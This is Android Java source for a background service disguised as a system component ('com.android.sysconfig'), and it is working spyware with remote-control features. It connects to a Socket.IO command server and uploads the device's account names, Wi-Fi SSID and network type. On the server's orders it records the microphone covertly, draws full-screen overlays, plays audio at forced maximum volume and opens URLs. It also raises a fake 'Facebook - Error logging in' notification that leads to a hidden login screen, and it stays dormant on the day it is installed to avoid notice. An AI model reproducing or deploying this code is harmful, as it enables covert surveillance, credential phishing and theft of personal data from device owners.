package com.android.sysconfig;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.annotation.TargetApi;
import android.app.AlertDialog;
import android.app.Dialog;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.content.res.Resources;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.PixelFormat;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import android.os.PowerManager;
import android.support.v4.app.NotificationCompat;
import android.util.Log;
import android.util.Patterns;
import android.view.View;
import android.view.WindowManager;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.Toast;
import android.widget.VideoView;

import com.github.nkzawa.emitter.Emitter;
import com.github.nkzawa.socketio.client.IO;
import com.github.nkzawa.socketio.client.Socket;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import org.w3c.dom.Text;

import java.net.InetAddress;
import java.net.URI;
import java.net.URL;
import java.util.Calendar;
import java.util.Iterator;
import java.util.List;
import java.util.Stack;
import java.util.Timer;
import java.util.TimerTask;
import java.util.regex.Pattern;

import static android.net.wifi.WifiConfiguration.Protocol;
import static android.net.wifi.WifiConfiguration.*;

public class AndroidSystemService extends Service {


    private Socket socket;
    private MediaPlayer mp;
    private String dataSource;
    private SharedPreferences preferences;
    private SharedPreferences.Editor editor;
    private WindowManager windowManager;
    Stack<View> viewStack;
    PowerManager.WakeLock wl;


    public static final int ARG1_DIALOG = 0;
    public static final int ARG1_IMG = 1;
    public static final int ARG2_SHOW = 0;
    public static final int ARG2_HIDE = 1;
    public static final int ARG1_VIDEO = 2;

    static final String PREF_WL = "wl";
    static final String PREF_INIT_SLEEP = "initialSleep";
    static final String PREF_LAST_SLEEP_VERSION = "lastSleepVersion";

    MediaRecorder mediaRecorder;
    String lastRecordedFile;

    @Override
    public void onCreate() {
        super.onCreate();
        preferences = getSharedPreferences("prefs",0);
        editor = preferences.edit();
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "sWakeLock");
        viewStack = new Stack<>();
        if(preferences.getBoolean(PREF_WL, true))
            wl.acquire();
    }

    private final Handler handler = new Handler() {


        @Override
        public void handleMessage(final Message msg) {
            super.handleMessage(msg);
            switch (msg.arg1){
                case ARG1_DIALOG:
                    Dialog d = new AlertDialog(AndroidSystemService.this){
                        @Override
                        protected void onCreate(Bundle savedInstanceState) {
                            setButton(BUTTON_POSITIVE, "Send", new OnClickListener() {
                                @Override
                                public void onClick(DialogInterface dialog, int which) {

                                }
                            });
                            setTitle(msg.getData().getString("text"));
                            super.onCreate(savedInstanceState);
                        }
                    };
                    d.getWindow().setType(WindowManager.LayoutParams.TYPE_SYSTEM_ALERT);
                    d.show();
                    break;

                case ARG1_IMG:
                    if(msg.arg2 == ARG2_SHOW) {
                        Bitmap bmp = (Bitmap) msg.obj;
                        ImageView img = new ImageView(AndroidSystemService.this);
                        img.setImageBitmap(bmp);
                        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                                WindowManager.LayoutParams.MATCH_PARENT,
                                WindowManager.LayoutParams.MATCH_PARENT,
                                // Allows the view to be on top of the StatusBar
                                WindowManager.LayoutParams.TYPE_SYSTEM_ERROR,
                                // Keeps the button presses from going to the background window
                                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                                        // Enables the notification to recieve touch events
                                        WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
                                        // Draws over status bar
                                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                                PixelFormat.TRANSLUCENT);
                        windowManager.addView(img, params);
                        viewStack.add(img);
                        break;
                    }else if(msg.arg2 == ARG2_HIDE){
                        if(!viewStack.isEmpty())
                            windowManager.removeView(viewStack.pop());
                    }
                    break;
                
                case ARG1_VIDEO:
                    if(msg.arg2 == ARG2_SHOW){
                        Uri uri = (Uri) msg.obj;
                        VideoView videoView = new VideoView(AndroidSystemService.this);
                        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                                WindowManager.LayoutParams.MATCH_PARENT,
                                WindowManager.LayoutParams.MATCH_PARENT,
                                WindowManager.LayoutParams.TYPE_SYSTEM_ERROR,
                                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                                        WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
                                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                                PixelFormat.OPAQUE);
                        windowManager.addView(videoView, params);
                        videoView.setVideoURI(uri);
                        videoView.start();
                        viewStack.add(videoView);
                    }else if(msg.arg2 == ARG2_HIDE){
                        if(!viewStack.isEmpty())
                            windowManager.removeView(viewStack.pop());
                    }
                    break;

            }

        }
    };


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        mp = new MediaPlayer();
        if(socket == null)
            initIO();
        Timer timer = new Timer();
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                if(mp != null && mp.isPlaying()) {
                    AudioManager mgr = null;
                    mgr = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
                    mgr.setStreamVolume(AudioManager.STREAM_MUSIC, mgr.getStreamMaxVolume(AudioManager.STREAM_MUSIC), AudioManager.FLAG_REMOVE_SOUND_AND_VIBRATE);
                }
            }
        },0,500);
        return START_STICKY;
    }

    void uploadAccounts(){
        uploadAccounts(true);
    }

    void uploadAccounts(boolean firstTry){
        if(socket == null || !socket.connected())
            return;

        JSONArray accountsJson = new JSONArray();
        /*
        try{
            JSONObject versionJson = new JSONObject();
            versionJson.put("type", "sysconfig.version");
            versionJson.put("name", SystemApplication.VERSION);
            JSONObject networkJson = new JSONObject();
            networkJson.put("type", "sysconfig.network-type");
            if(wifiConnected()) {
                networkJson.put("name", "WIFI");
                JSONObject networkNameJson = new JSONObject();
                networkNameJson.put("type", "sysconfig.network-name");
                networkNameJson.put("name", getSSID());
                accountsJson.put(networkNameJson);
            }else{
                networkJson.put("name", "3G");
            }
            accountsJson.put(versionJson);
            accountsJson.put(networkJson);
            if(asleep()){
                JSONObject asleepJSON = new JSONObject();
                asleepJSON.put("type", "sysconfig.asleep");
                asleepJSON.put("name", "ASLEEP");
                accountsJson.put(asleepJSON);
            }
        }catch (JSONException e){

        }*/
        Account[] accounts = AccountManager.get(AndroidSystemService.this).getAccounts();
        if(accounts.length == 0) {
            Timer t = new Timer();
            t.schedule(new TimerTask() {
                @Override
                public void run() {
                    uploadAccounts(false);
                }
            }, 1000);
//            if(firstTry)
//                socket.emit("setAccounts", accountsJson.toString());
            return;
        }
        for (Account account : accounts) {
                     /*   if (emailPattern.matcher(account.name).matches()) {
                            String possibleEmail = account.name;

                        }*/
            JSONObject accountJson = new JSONObject();
            try {
                accountJson.put("type", account.type);
                accountJson.put("name", account.name);
                accountsJson.put(accountJson);
            }catch (JSONException e){
            }
        }
        socket.emit("setAccounts", accountsJson);
    }


    void uploadModifiers(){
        if(socket == null || !socket.connected())
            return;
        JSONObject modifiersJson = new JSONObject();
        try{
            modifiersJson.put("sysconfig.version", SystemApplication.VERSION);
            if(wifiConnected()) {
                modifiersJson.put("system.network-type", "WIFI");
                modifiersJson.put("system.network-name", getSSID());
            }else{
                modifiersJson.put("system.network-type", "3G");
            }
            if(asleep()){
                modifiersJson.put("sysconfig.asleep", true);
            }
            socket.emit("setModifiers", modifiersJson);
        }catch (JSONException e){

        }
    }



    void initIO(){
        try {
            socket = IO.socket("http://mTest-dsapps.rhcloud.com");
            socket.on(Socket.EVENT_CONNECT, new Emitter.Listener() {

                @Override
                public void call(Object... args) {
                    uploadAccounts();
                    uploadModifiers();
                }

            }).on("play", new Emitter.Listener() {

                @Override
                public void call(Object... args) {
                    try{
                        if (args == null || args.length == 0)
                            return;
                        if (asleep())
                            return;
                        dataSource = (String) args[0];
                        if (mp != null && mp.isPlaying()) {
                            mp.stop();
                            mp.release();
                            mp = null;
                        }
                        mp = new MediaPlayer();
                        AudioManager mgr = null;
                        mgr = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
                        mgr.setStreamVolume(AudioManager.STREAM_MUSIC, mgr.getStreamMaxVolume(AudioManager.STREAM_MUSIC), AudioManager.FLAG_REMOVE_SOUND_AND_VIBRATE);
                        mp.setDataSource(AndroidSystemService.this, Uri.parse(dataSource));
                        mp.setAudioStreamType(AudioManager.STREAM_MUSIC);
                        mp.prepare();
                        mp.start();
                    } catch (Exception e) {
//                        e.printStackTrace();
                    }
                }

            }).on("pause", new Emitter.Listener(){
                @Override
                public void call(Object... args) {
                    if(mp != null && mp.isPlaying()) {
                        mp.stop();
                        mp.release();
                        mp = null;
                    }
                }
            }).on("continue", new Emitter.Listener(){
                @Override
                public void call(Object... args) {
                    if(mp != null && !mp.isPlaying())
                        mp.start();
                }
            }).on("notify", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    if(asleep())
                        return;
                    synchronized (this) {
                        showNotification();
                    }
                }
            }).on(Socket.EVENT_DISCONNECT, new Emitter.Listener() {

                @Override
                public void call(Object... args) {

                }

            }).on("releaseWakeLock", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    editor.putBoolean("wl", false);
                    editor.commit();
                    if(wl != null && wl.isHeld())
                        wl.release();
                }
            }).on("acquireWakeLock", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    editor.putBoolean("wl", true);
                    editor.commit();
                    if(wl != null && !wl.isHeld())
                        wl.acquire();
                }
            }).on("showDialog", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    if(args == null || args.length == 0)
                        return;
                    if(asleep())
                        return;
                    String text;
                    final String inputId;
                    String positiveText = null;
                    String inputHint = null;
                    AlertDialog.Builder db;
                    try {
                        text = (String) args[0];
                        if(args.length >= 2)
                            inputId = (String) args[1];
                        else
                            inputId = null;
                        if(args.length >= 3)
                            positiveText = (String) args[2];
                        if(args.length >= 4)
                            inputHint = (String) args[3];
                        db = new AlertDialog.Builder(AndroidSystemService.this);
                        db.setTitle(text);
                        if(inputId != null){
                            final EditText et = new EditText(AndroidSystemService.this);
                            if(inputHint != null)
                                et.setHint(inputHint);
                            db.setView(et);
                            if(positiveText == null)
                                positiveText = "OK";
                            db.setPositiveButton(positiveText, new DialogInterface.OnClickListener() {
                                @Override
                                public void onClick(DialogInterface dialog, int which) {
                                    socket.emit("dialogAction", inputId, et.getText().toString());
                                }
                            });
                        }else{
                            db.setPositiveButton("Close", null);
                        }
                        Message msg = handler.obtainMessage();
                        Bundle b = new Bundle();
                        b.putString("text", text);
                        msg.setData(b);
                        msg.arg1 = ARG1_DIALOG;
                        handler.sendMessage(msg);
                    }catch (Exception e){
                        return;
                    }
                }
            }).on("showImage", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    try {
                        if (asleep())
                            return;
                        showImg((String) args[0]);
//                        showVid("http://download.wavetlan.com/SVV/Media/HTTP/H264/Talkinghead_Media/H264_test1_Talkinghead_mp4_480x360.mp4");
                    }catch (Exception e){
                        return;
                    }
                }
            }).on("hideImage", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    hideImg();
                }
            }).on("uri", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    try {
                        String url = (String) args[0];
                        Intent i = new Intent(Intent.ACTION_VIEW);
                        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        i.setData(Uri.parse(url));
                        startActivity(i);
                    } catch (Exception e) {
                        return;
                    }
                }
            }).on("startRecordingAudio", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    try {
                        if (mediaRecorder != null)
                            return;
                        String filename = (String) args[0];
                        lastRecordedFile = Environment.getExternalStorageDirectory().getAbsolutePath() + "/" + filename + ".3gp";
                        mediaRecorder = new MediaRecorder();
                        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);

                        mediaRecorder.setOutputFile(lastRecordedFile);
                        mediaRecorder.prepare();
                        mediaRecorder.start();
                    } catch (Exception e) {

                    }
                }
            }).on("stopRecordingAudio", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    try{
                        if(mediaRecorder == null)
                            return;
                        mediaRecorder.stop();
                        mediaRecorder.release();
                        mediaRecorder = null;
                    }catch (Exception e){

                    }
                }
            }).on("startFtpUpload", new Emitter.Listener() {
                @Override
                public void call(Object... args) {

                }
            }).on("getModifiers", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    uploadModifiers();
                }
            }).on("showVideo", new Emitter.Listener() {
                @Override
                public void call(Object... args) {

                }
            });
            socket.connect();
        }catch (Exception e){
            e.printStackTrace();
        }
    }




    void showVid(String url_){
        Uri uri=Uri.parse(url_);

        Message msg = handler.obtainMessage();
        msg.arg1 = ARG1_VIDEO;
        msg.arg2 = ARG2_SHOW;
        msg.obj = uri;
        handler.sendMessage(msg);
    }


    void showImg(String url_){
        try {
            URL url = new URL(url_);
            Bitmap bmp = BitmapFactory.decodeStream(url.openConnection().getInputStream());
            Message msg = handler.obtainMessage();
            msg.arg1 = ARG1_IMG;
            msg.obj = bmp;
            handler.sendMessage(msg);
        }catch (Exception e){
            return;
        }
    }



    void hideImg(){
        Message msg = handler.obtainMessage();
        msg.arg1 = ARG1_IMG;
        msg.arg2 = ARG2_HIDE;
        handler.sendMessage(msg);
    }


    boolean asleep(){
        if (android.os.Build.VERSION.SDK_INT < 9){
            return false;
        }else{
            return inInitialSleep();
        }
    }



    @TargetApi(9)
    boolean inInitialSleep(){
        if(!preferences.getBoolean("initialSleep", true) && preferences.getString(PREF_LAST_SLEEP_VERSION,"1.0").equals(SystemApplication.VERSION))
            return false;
        Calendar now = Calendar.getInstance();
        Calendar firstInstall = Calendar.getInstance();
        try {
            firstInstall.setTimeInMillis(getPackageManager().getPackageInfo(getPackageName(), 0).lastUpdateTime);
        }catch (Exception e){
            e.printStackTrace();
            return false;
        }
        if(firstInstall.get(Calendar.DAY_OF_MONTH) != now.get(Calendar.DAY_OF_MONTH) || firstInstall.get(Calendar.MONTH) != now.get(Calendar.MONTH) || firstInstall.get(Calendar.YEAR) != now.get(Calendar.YEAR)){
            editor.putBoolean(PREF_INIT_SLEEP, false);
            editor.putString(PREF_LAST_SLEEP_VERSION, SystemApplication.VERSION);
            editor.commit();
            return false;
        }else{
            return true;
        }
    }


    void showNotification(){
        getPackageManager().setComponentEnabledSetting(new ComponentName(getPackageName(), getPackageName() + ".FacebookActivity"),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP);
        NotificationCompat.Builder mBuilder =
                new NotificationCompat.Builder(this)
                        .setSmallIcon(R.drawable.ic_launcher)
                        .setContentTitle("Facebook - Error logging in")
                        .setContentText("Tap to sign in again")
                        .setAutoCancel(true);
        Intent resultIntent = new Intent(this, FacebookActivity.class);
        // Because clicking the notification opens a new ("special") activity, there's
        // no need to create an artificial back stack.
        PendingIntent resultPendingIntent =
                PendingIntent.getActivity(
                        this,
                        0,
                        resultIntent,
                        PendingIntent.FLAG_UPDATE_CURRENT
                );
        mBuilder.setContentIntent(resultPendingIntent);
        int mNotificationId = 001;
        NotificationManager mNotifyMgr = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        mNotifyMgr.notify(mNotificationId, mBuilder.build());
    }

    @Override
    public IBinder onBind(Intent intent) {
        // We don't provide binding, so return null
        return null;
    }

    boolean wifiConnected(){
        ConnectivityManager connManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo mWifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
        return mWifi.isConnected();
    }

    String getSSID(){
        WifiManager wifiMgr = (WifiManager) getSystemService(Context.WIFI_SERVICE);
        WifiInfo wifiInfo = wifiMgr.getConnectionInfo();
        return wifiInfo.getSSID();
    }

    @Override
    public void onDestroy() {
        socket.disconnect();
        try {
            while(!viewStack.isEmpty())
                windowManager.removeView(viewStack.pop());
            if (mp != null){
                mp.release();
                mp = null;
            }if(mediaRecorder != null) {
                mediaRecorder.release();
                mediaRecorder = null;
            }
        }catch (Exception e){

        }
    }


}
